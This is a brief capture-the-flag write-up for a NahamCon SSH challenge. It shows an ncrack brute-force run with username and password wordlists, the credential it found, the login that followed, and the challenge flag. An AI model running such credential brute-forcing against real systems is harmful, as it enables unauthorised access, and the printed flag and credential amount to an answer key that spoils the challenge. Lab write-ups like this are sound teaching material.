# Hydraulic

Tags: _ncrack_

## Challenge

>Author: @JohnHammond#6971
>
>This is Stage 2 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
>Gain access with the information you have gathered thus far and retrieve the flag.
>
>You may bruteforce this challenge... hence the name ;)
>
>Press the Start button on the top-right to begin this challenge.
>
>Connect with:
>
>ssh -p 32317 challenge.nahamcon.com
>



## Solving

```
$ ncrack -U mission-usr.lst -P mission-password.lst ssh://challenge.nahamcon.com:32317

Discovered credential on ssh://35.239.227.150:32317 'pavo' 'starsinthesky'
```

```
$ ssh pavo@challenge.nahamcon.com -p 32317

cat flag.txt
flag{cadbbfd75d2547700221f8c2588e026e}
```

`flag{cadbbfd75d2547700221f8c2588e026e}`
